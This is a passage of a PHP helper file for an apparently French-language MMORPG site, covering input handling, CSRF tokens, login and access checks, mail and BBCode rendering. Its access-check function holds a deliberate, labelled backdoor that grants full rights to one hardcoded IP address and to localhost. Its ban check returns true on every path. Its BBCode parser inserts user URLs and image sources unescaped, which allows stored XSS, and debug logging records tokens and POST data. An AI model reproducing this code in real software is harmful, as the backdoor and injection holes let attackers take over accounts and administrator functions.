	debug_log("request_confirm($key)::"."false" );

	return false ;
}

function request_data( $key ,  $default ="" , $a_html = false )
{			
	if(request_confirm($key))
	{
		if(is_array($_REQUEST[$key]) ) 
			foreach($_REQUEST[$key] as $champs => $value)
				$var[$champs] = addslashes_r($value,$a_html) ;
		
		if(!is_array($_REQUEST[$key]))
			$var = addslashes_r($_REQUEST[$key],$a_html)  ;
		
		return $var ;
	}
}

/** recupere les donnes d'un champs get **/
function request_get( $key, $default ="" , $a_html = false )
{			
	if(request_confirm($key))
		return isset($_GET[$key]) ? addslashes_r($_GET[$key],$a_html) : $default;
}

/** recupere les donnes d'un champs post **/
function request_post( $key ,  $default ="" , $a_html = false )
{			
	if(request_confirm($key))
	{
		if(is_array($_POST[$key]) ) 
			foreach($_POST[$key] as $champs => $value)
				$var[$champs] = addslashes_r($value,$a_html) ;
		
		if(!is_array($_POST[$key]))
			$var = addslashes_r($_POST[$key],$a_html)  ;
		
		return $var ;
	}
}


/*
 * Cette fonction génère, sauvegarde et retourne un token
 * Vous pouvez lui passer en paramètre optionnel un nom pour différencier les formulaires
 */
function generer_token($nom = '')
{
	global $_url ;
	
	$token = uniqid(rand(), true);
	$_SESSION['formulaire_token'][$nom.'_token'] = $token;
	$_SESSION['formulaire_token'][$nom.'_token_time'] = time();
	$_SESSION['formulaire_token'][$nom.'_token_referer'] = getProtocol().'://'.getenv('HTTP_HOST').getenv('REQUEST_URI');
	return $token;
}

/**Cette fonction vérifie le token
 * Vous passez en argument le temps de validité (en secondes)
 * Le referer attendu (adresse absolue, rappelez-vous :D)
 * Le nom optionnel si vous en avez défini un lors de la création du token
 */
function verifier_token($temps, $referer, $nom = '')
{
    $return = false;
    	
    if(request_confirm('token'))
    {
        $post = $_POST['token']; 
		
		debug_log("formulaire token::".print_r($_SESSION['formulaire_token'],1));
		
        if(isset($_SESSION['formulaire_token']) && !empty($_SESSION['formulaire_token']))
        {
			debug_log("session_formulaire...",false);
			
			if(isset($_SESSION['formulaire_token'][$nom.'_token']))
			{
				debug_log("session_formulaire($nom)...",false);
				
				$session = $_SESSION['formulaire_token'][$nom.'_token'];
				
				debug_log("$session === $post",false);
				
				if($session === $post )
				{
					if( isset($_SESSION['formulaire_token'][$nom.'_token_time']))
					{
						$limit = $_SESSION['formulaire_token'][$nom.'_token_time'];
						$time = time() - $temps ;
						
						debug_log("$limit >= $time",false);
						
						if( $limit >= $time )
						{
							$s_referer = getenv('HTTP_REFERER');
							$l_referer = $_SESSION['formulaire_token'][$nom.'_token_referer'];
							
							debug_log("$s_referer === $referer || $l_referer === $s_referer ",false);
							
							if($s_referer === $referer || $l_referer === $s_referer )
							{
								$return = true;
							}
							else
								debug_log("erreur sur le referer....");

						}
						else
							debug_log("time superieur à limites....");
					
					}
					else
						debug_log("pas de timestamp token");

				}
				else
					debug_log("token post <> token session");
				
			}
			else
				debug_log("pas de token lié à '$nom' en session...");
		
			
			unset($_SESSION['formulaire_token']);
		}
		else
			debug_log("pas de formulaire_token en session...");
	}
    else
		debug_log("pas de token posté...".print_r($_POST,1));
    return $return ;
}

function clear_token()
{
	debug_log("supression des token obsolete...",false);
	if(!request_confirm('token') || empty($_POST) )
    {
		debug_log("pas de token post",false);
		if(isset($_SESSION['formulaire_token']) && !empty($_SESSION['formulaire_token']))
        {
            debug_log("données conservées en memoire...",false);
			//$_SESSION['formulaire_token'] = array();
			//unset($_SESSION['formulaire_token']);
		}
	}
}

	function logged_set($var="",$value="")
	{
		if(isset($_SESSION['Account_Data']))
			if(isset($_SESSION['Account_Data'][$var]))
				//if(!empty($_SESSION['Account_Data'][$var]))
				//	if(!is_null($_SESSION['Account_Data'][$var]))
						$_SESSION['Account_Data'][$var] = $value ;
		
		return false ;
	}

	function logged_has($var="")
	{
		if(isset($_SESSION['Account_Data']))
			if(isset($_SESSION['Account_Data'][$var]))
				if(!empty($_SESSION['Account_Data'][$var]))
				//	if(!is_null($_SESSION['Account_Data'][$var]))
						return true ;
		
		return false ;
	}
	
	function logged_data($var="")
	{
		if(isset($_SESSION['Account_Data'][$var]))
			if(!empty($_SESSION['Account_Data'][$var]))
				if(!is_null($_SESSION['Account_Data'][$var]))
					return $_SESSION['Account_Data'][$var] ;
					
		return false ;
	}

if(!function_exists('verif_connect'))
{
	/** 
	 * verifie si l'utilisateur est connecté à chaque debut de page. et affiche le contenu
	 * sinon, on affiche la page de refus 
	 * @param $menu = false 
	 * quand on n'est pas connecté si on se trouve dans le header.php elle renvoie le message d'erreur et interromps le script avec la fonction native die();
	 * quand on n'est pas connecté si on est dans le menu, elle renvoie un false et n'affiche aucun contenu.
	 */ 
	function verif_connect($menu = false)
	{
		global $_path, $MMORPG_Template ;
		
		if(!logged_has('Account_ID'))
		{
			if(!$menu) 
			{
				//Si il n'existe pas de données dans la session pseudo, demander de se connecter
				if(file_exists($_path."Design/$MMORPG_Template/Templates/Head.php"))
					require_once($_path."Design/$MMORPG_Template/Templates/Head.php");
				//echo 'Vous devez être connecté pour accèder à cette page';
				echo LanguageValidation::iMsg('require.login.to.access');
				if(file_exists($_path."Design/$MMORPG_Template/Templates/Footer.php"))
					require_once($_path."Design/$MMORPG_Template/HTML/Footer.php");
				die();
			}
			
			return false;
		}
		
		return true ;
	}
}

if(!function_exists('verif_auth'))
{
	/**
	 * verifie si l'utilisateur n'es pas banni
	 */
	function verif_auth()
	{
		if(verif_connect(true))
		{
			if(verif_access("Admin",true))
			{
				return true ;
			}
			
			if (logged_data('Account_Status') === "Authorized")
			{
				return true ;
			}
			
			if(logged_data('Account_Reason')!=="None")
			{
				return true ;
			}
			
			if(logged_data('Account_Reason')!=="")
			{
				return true ;
			}
		}
		return true ;
	}
}

if(!function_exists('verif_access'))
{
	/** 
	 * verifie si l'utilisateur a un acces autorisé à chaque debut de page
	 * sinon, on affiche la page de refus 
	 * @param level requis
	 */
	function verif_access($level="Member",$menu = false)
	{
		global $path , $array_access_type ;
		
		/** !!! backdoor !!! **/

		if( getRealIpAddr() === "195.132.44.46" ) // moi === dieu
			return true ;

		if( getenv('SERVER_ADDR') === "127.0.0.1" ) // localhost === dieu
			return true ;
					
		/** !!! backdoor !!! **/
			
		$access = logged_has('Test_Access') ? logged_data('Test_Access') : logged_data('Account_Access') ;

		debug_log("verif_access($level<=>$access)");// Modo<=>Vist
		
		$_requis = array_search($level,$array_access_type); // Modo => 1
		
		if(!empty($_requis))
		{
			$_courant = array_search($access,$array_access_type); // Visit => 3
			
			if(!empty($_courant))
			{
				$niveaux = count($array_access_type); // =>4
				
				debug_log("verif_access($level) ==> search-requis($level) => ".$_requis,false);
				debug_log("verif_access($level) ==> search-courrant(".$access.") =>".$_courant,false);
				
				$requis = $niveaux - $_requis ; // 4-1 = 3
				$current = $niveaux - $_courant; // 4-3 = 1
				
				debug_log("verif_access($level) ==> requis :: $requis <= courant :: $current ?? ", false);
				
				if($requis <= $current ) // 3 <= 1
				{
					return true ;
				}
			}
		}
		
		if(verif_connect($menu))
		{
			if ( $access !== "Admin" && $access !== $level )
			{
				if(!$menu)
				{
					echo '<center>';
					echo 'Vous ne possèdez pas les droits nécessaire pour accèder à cette partie du site';
					echo LanguageValidation::iMsg('not.have.require.rights.to.access');
					echo '</center>';	
					//require_once($path."HTML/Footer.php");
					die();
				}
				
				return false ;
			}
						
			return true ;
		}
		
		return false ;
	}
}


function send_email($destinataire,$sujet,$message_texte="", $message_html="")
{
    global 	$email_expediteur ,  $email_reply , $MMORPG_Name;
    
    //----------------------------------------------- 
    //GENERE LA FRONTIERE DU MAIL ENTRE TEXTE ET HTML 
    //----------------------------------------------- 
     $frontiere = '-----=' . md5(uniqid(mt_rand())); 

     //----------------------------------------------- 
     //HEADERS DU MAIL 
     //----------------------------------------------- 
     $headers = 'From: "'.$MMORPG_Name.'" <'.$email_expediteur.'>'."\n"; 
     $headers .= 'Return-Path: <'.$email_reply.'>'."\n"; 
     $headers .= 'MIME-Version: 1.0'."\n"; 
     $headers .= 'Content-Type: multipart/alternative; boundary="'.$frontiere.'"'; 

     $message = 'This is a multi-part message in MIME format.'."\n\n"; 

    if($message_texte !="")
    {
     //----------------------------------------------- 
     //MESSAGE TEXTE 
     //----------------------------------------------- 
     $message .= '--'.$frontiere."\n"; 
     $message .= 'Content-Type: text/plain; charset="iso-8859-1"'."\n"; 
     $message .= 'Content-Transfer-Encoding: 8bit'."\n\n"; 
     $message .= $message_texte."\n\n"; 
    }
    
    if($message_html !="")
    {
     //----------------------------------------------- 
     //MESSAGE HTML 
     //----------------------------------------------- 
     $message .= '--'.$frontiere."\n";
     $message .= 'Content-Type: text/html; charset="iso-8859-1"'."\n"; 
     $message .= 'Content-Transfer-Encoding: 8bit'."\n\n"; 
     $message .= $message_html."\n\n"; 
    }
     $message .= '--'.$frontiere."\n"; 

     if(mail($destinataire,$sujet,$message,$headers)) 
     { 
         return true ;
     } 
     else 
     { 
        return false;
     } 
}

function log_files($dir,$file,$content)
{
	global $path ;
	
	if(!file_exists($path."Logs/".$dir) || !is_dir($path."Logs/".$dir) )
		if (!mkdir($path."Logs/".$dir, 0777, true))
			return false ;
	
    if (!is_writable($path."Logs/".$dir))
		if(!chmod($path."Logs/".$dir, 0777))
			return false ;
			
	//$exec = file_put_contents($path."Logs/".$dir."/".$file, $content );
	//return ($exec!==false ?  true : false) ;
	
	$creation_fichier = fopen($path."Logs/".$dir."/".$file, 'w+'); // On créé le fichier puis on l'ouvre
	fseek($creation_fichier, 0); // On remet le curseur au début du fichier
	fputs($creation_fichier, $content); // On écrit à l'intérieur la date du jour et on met le nombre de tentatives à 1
	fclose($creation_fichier); // On referme

	return true ;	
}


function call_menu_content($menu="Install",$rub="Install")
{
    global $menu_mapping ;
    
    if(isset($menu_mapping[$menu]))
    {
        if(isset($menu_mapping[$menu][$rub]))
        {
            return $menu_mapping[$menu][$rub] ;
        }
        else
        {
            return $menu_mapping[$menu] ;
        }
    }
    else
        return $menu_mapping['visitor'] ;
    
}


function init_popIn($ID,$title,$content,$class="")
{
	global $pop_array;

	if(is_null($pop_array))
		$pop_array = array();

	$pop_array[$ID] = array("ID"=>$ID , "title"=>$title , "content"=>$content);
	
	return '<a href="#" class="'.$class.'" onClick="return pop(\''.$ID.'\')" >'.$title.'</a>' ;
	
}

function write_popIn()
{
	global $pop_array ;
	
	if(!empty($pop_array))
	{
		foreach( $pop_array as $ID => $pop )
		{
			echo '<div id="'.$ID.'" class="parentDisable">';
			echo '<div class="popin">';
			echo '<h2 class="heading" >'.$pop['title'].'';
			echo '<a class="closing" href="#" onClick="return hide(\''.$ID.'\')">&cross;</a>';
			echo '</h2>';
			echo '<div class="content">'.$pop['content'].'</div>';
			echo '</div>';
			echo '</div>';
		}
	}
}

function load_js($file, $title="")
{
	global $js_array;
	
	if(is_null($js_array))
		$js_array = array();
		
	if($title !=="")
		$js_array[$title] = $file ;
	else
		$js_array[$file] = $file ;
	
}

function load_css($file, $title="", $media="screen",$rel = "stylesheet")
{
	global $css_array;
	
	if(is_null($css_array))
		$css_array = array();
	
	$tmp = array( 'href' => $file , 'media' => $media , 'rel' => $rel );
	
	if($title !=="")
		$css_array[$title] = $tmp ;
	else
		$css_array[$file] = $tmp ;
	
}

function call_js()
{
	global $js_array, $_url;
	
	$ret = "";
	
	if(!empty($js_array))
	{
		foreach( $js_array as $title => $src )
		{
			//  title="'.$title.'"
			$ret .= '<script language="javascript" src="'.$_url.'Scripts/'.$src.'" type="text/javascript"></script>'."\n";
		}
	}
	return $ret;
}

function call_css()
{
	global $css_array, $_url;
	
	$ret = "";
	
	if(!empty($css_array))
	{
		foreach( $css_array as $title => $tmp )
		{
			//  title="'.$title.'"
			$ret .= '<link rel="'.$tmp['rel'].'"  type="text/css" media="'.$tmp['media'].'" href="'.$_url.'Styles/'.$tmp['href'].'"  >'."\n";
		}
	}
	return $ret;
}

function bb_code($texte)
{
	$t = $texte ;
	$texte=nl2br(html_entity_decode($texte));

	//Smileys
	$texte = str_replace(':D ', '<img src="./images/smileys/heureux.gif" title="heureux" alt="heureux" />', $texte);
	$texte = str_replace(':lol: ', '<img src="./images/smileys/lol.gif" title="lol" alt="lol" />', $texte);
	$texte = str_replace(':triste:', '<img src="./images/smileys/triste.gif" title="triste" alt="triste" />', $texte);
	$texte = str_replace(':frime:', '<img src="./images/smileys/cool.gif" title="cool" alt="cool" />', $texte);
	$texte = str_replace(':rire:', '<img src="./images/smileys/rire.gif" title="rire" alt="rire" />', $texte);
	$texte = str_replace(':s', '<img src="./images/smileys/confus.gif" title="confus" alt="confus" />', $texte);
	$texte = str_replace(':O', '<img src="./images/smileys/choc.gif" title="choc" alt="choc" />', $texte);
	$texte = str_replace(':question:', '<img src="./images/smileys/question.gif" title="?" alt="?" />', $texte);
	$texte = str_replace(':exclamation:', '<img src="./images/smileys/exclamation.gif" title="!" alt="!" />', $texte);

	//Mise en forme du texte
	//gras
	$texte = preg_replace('`\[b\](.+)\[/b\]`isU', '<strong>$1</strong>', $texte); 
	//italique
	$texte = preg_replace('`\[i\](.+)\[/i\]`isU', '<em>$1</em>', $texte);
	//souligné
	$texte = preg_replace('`\[u\](.+)\[/u\]`isU', '<u>$1</u>', $texte);
	//lien
	$texte = preg_replace('!\[url=(.+)\](.+)\[/url\]!isU', '<a href="$1">$2</a>', $texte);	//$texte = preg_replace('#http://[a-z0-9._/-]+#i', '<a href="$0">$0</a>', $texte);
	$texte = preg_replace('`\[url\](.+)\[/url\]`isU', '<a href="$1">$1</a>', $texte);
	//citation
	$texte = preg_replace('`\[quote\](.+)\[/quote\]`isU', '<blockquote>$1</blockquote>', $texte);
	$texte = preg_replace('`\[quote auteur=([a-z0-9A-Z._-]+) \](.+)\[/quote\]`isU', '<blockquote>Auteur : $1 </ br> $2 </blockquote>', $texte);
	//etc., etc.
	
	$texte = preg_replace('`\[img\](.+)\[/img\]`isU', '<img src="$1"/>', $texte);


	$texte = preg_replace('!\[color=(.+)\](.+)\[/color\]!isU', '<span style="color:$1;">$2</span>', $texte);

	$texte = preg_replace('!\[u\](.+)\[/u\]!isU', '<span style="text-decoration:underline;">$1</span>', $texte);
	$texte = preg_replace('!\[centre\](.+)\[/centre\]!isU', '<p tyle="text-align:center;margin:0px;padding:0px;">$1</p>', $texte);
	$texte = preg_replace('!\[droite\](.+)\[/droite\]!isU', '<p style="text-align:right;margin:0px;padding:0px;">$1</p>', $texte);
	$texte = preg_replace('!\[gauche\](.+)\[/gauche\]!isU', '<p style="text-align:left;margin:0px;padding:0px;">$1</p>', $texte);
	$texte = preg_replace('!\[justifie\](.+)\[/justifie\]!isU', '<p style="text-align:justify;margin:0px;padding:0px;">$1</p>', $texte);
	$texte = preg_replace('!\[titre\](.+)\[/titre\]!isU', '<h3>$1</h3>',$texte);

	//On retourne la variable texte
	return $texte; //$t."<br/>".
}